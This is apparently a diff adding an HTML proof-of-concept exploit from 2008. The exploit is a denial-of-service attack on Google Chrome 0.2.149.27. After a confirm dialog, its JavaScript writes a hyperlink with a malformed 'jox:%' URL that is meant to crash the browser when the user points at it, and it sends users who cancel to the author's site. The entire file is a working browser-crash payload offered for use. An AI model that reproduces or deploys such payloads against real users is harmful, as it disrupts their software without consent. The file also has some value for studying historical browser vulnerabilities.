@@ -1,0 +1,40 @@
+
+<!-----------------------------------------------
+|						|
+| Vulnerability discovered by Rishi Narang	|
+|						|
+| Exploit by LiquidWorm, September 2008		|
+| 						|
+| http://www.zeroscience.org			|
+|						|
+| liquidworm [t00t] gmail.com			|
+|						|
+------------------------------------------------>
+
+<html>
+
+<title>Google Chrome DoS Exploit</title>
+
+<head>
+
+<br />
+<br />
+
+<script type="text/javascript">
+
+alert("Google Chrome Browser 0.2.149.27 Denial of Service Exploit");
+
+var box = confirm("Press OK to start exploitation\nPress Cancel to skip exploitation");
+
+if (box == true) 
+{
+	document.write("Just point to the hyperlink... <a href=\"jox:%\"><strong>HERE</strong></a>");	
+}
+
+else { alert("Ok Dude!"); window.location.href = "http://www.zeroscience.org";	}
+ 
+</script>
+
+</head>
+
+</html>
